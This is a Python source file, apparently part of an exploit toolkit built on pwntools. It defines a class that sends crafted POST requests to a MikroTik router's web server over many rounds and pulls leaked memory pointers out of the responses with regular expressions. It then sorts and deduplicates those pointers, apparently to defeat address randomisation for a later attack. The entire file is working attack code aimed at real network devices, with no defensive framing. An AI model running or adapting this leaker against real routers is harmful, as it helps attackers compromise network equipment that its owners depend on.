import re
import time
from binascii import hexlify
from collections import Counter

from pwn import log

from lib.defines import PORTS, TARGET
from lib.utils import craft_post_header, create_socket


class MikroLeaker(object):
    """
        Class for storing functions to leak pointers remotely
        from given MikroTik(TM) webserver (www)

        Keyword Arguments:

            - leak_rounds (int): amount of times (rounds) to leak

            - leak_attempts (int): amount of attempts per round to leak information

            - leak_wait_time (int): amount of time to wait between rounds
                if no (valid) pointers found

        Example Usage:

            >>> leaker = MikroLeaker(leak_attempts=70, leak_rounds=30, leak_wait_time=10)
            >>> leaker.leak()
            >>> leaker.analyze_leaks()
    """

    def __init__(self, context, **kwargs):
        self.leakedlist = list()
        self.leak_rounds = 30
        self.leak_attempts = 70
        self.leak_wait_time = 10

        self.context = context

        for kwarg in ("leak_attempts", "leak_rounds", "leak_wait_time"):
            if kwargs.get(kwarg) and isinstance(kwargs.get(kwarg), int):
                setattr(self, kwarg, kwargs[kwarg])

    def leak(self, close=True, trim=True):
        """

        :param close:
        :param trim:
        :return:
        """
        current_round = 0
        total_leak_counter = 0
        leak_adjust_switch = False

        while True:
            log.info("Round: {}".format(current_round))
            round_hits = 0
            for _ in range(self.leak_attempts):
                leaked = self.leak_pointer(close=close, trim=trim)
                if leaked is not None:
                    for pointer in leaked:
                        log.info("-> 0x{}".format(pointer))
                        self.leakedlist.append(pointer)
                        round_hits += 1

            if round_hits == 0:
                log.warning("unable to leak valid pointers during round, "
                            "trying again after {} seconds".format(self.leak_wait_time))
                time.sleep(self.leak_wait_time)
                if leak_adjust_switch:
                    leak_adjust_switch = False
                    self.leak_attempts -= 10
                else:
                    leak_adjust_switch = True
                    self.leak_attempts += 10
            else:
                total_leak_counter += round_hits
                if current_round != self.leak_rounds:
                    current_round += 1
                else:
                    break

        log.success("leaked {} possible pointers!".format(total_leak_counter))

        return self.leakedlist

    def analyze_leaks(self, leakedlist=None):
        """

        :param leakedlist:
        :return:
        """

        sortedlist = list()

        if isinstance(leakedlist, list):
            if len(leakedlist) > 1:
                self.leakedlist = leakedlist
        elif len(self.leakedlist) < 2:
            log.warning("not enough pointers to analyse from leaked list")
            return False

        log.info("analyzing pointers from leaked list...")

        for pointer in self.leakedlist:
            sortedlist.append(int("0x{}".format(pointer), 16))

        log.info("sorting pointers: ")
        sortedlist = sorted(sortedlist)

        for pointer in sortedlist:
            log.info("-> {}".format(hex(pointer)))

        duplicates = Counter(sortedlist)

        log.info("attempting to locate duplicates...")

        counter = 0
        for key, value in duplicates.items():
            if value > 1:
                log.info("found duplicate pointer: {}".format(hex(key)))
                counter += 1

        if counter == 0:
            log.warning("could not locate any duplicates")

        return True

    def leak_pointer(self, close=False, trim=False):
        """

        :param close:
        :param trim:
        :return:
        """

        if not hasattr(TARGET, "host"):
            raise RuntimeError("No host specified in TARGET namespace")

        valid_pointers = list()
        address_size = self.context.bits >> 2

        pointer_expressions = (
            re.compile(r"0805\w{0,4}"),
            re.compile(r"774\w{0,5}"),
            re.compile(r"775\w{0,5}"),
            re.compile(r"776\w{0,5}"),
            re.compile(r"777\w{0,5}"),
            re.compile(r"778\w{0,5}"),
            re.compile(r"779\w{0,5}"),
            # re.compile(r"7f0\w{0,5}"),
            # re.compile(r"7f1\w{0,5}"),
            # re.compile(r"7f2\w{0,5}"),
            # re.compile(r"7f3\w{0,5}"),
            # re.compile(r"7f4\w{0,5}"),
            # re.compile(r"7f5\w{0,5}"),
            # re.compile(r"7f6\w{0,5}"),
            # re.compile(r"7f7\w{0,5}"),
            # re.compile(r"7f8\w{0,5}"),
            # re.compile(r"7f9\w{0,5}"),
        )

        # disable pwntools sock create and send messages
        with self.context.local():
            self.context.log_level = "WARNING"
            sock = create_socket(TARGET.host, PORTS["HTTP_PORT"][0])
            sock.send(craft_post_header())
            data = sock.recv(4096).decode().split("\n")

            if close:
                sock.close()

        if len(data) == 9:
            data = hexlify((data[7] + data[8]).encode())
        else:
            data = hexlify((data[-1]).encode())
        if trim:
            data = data[26:]

        data = data.decode()

        for pointer_exp in pointer_expressions:
            match = pointer_exp.search(data)
            if match:
                left, right = match.span()
                if -(left - right) == address_size:
                    valid_pointers.append(data[left:right])

        if valid_pointers:
            return valid_pointers

        return None
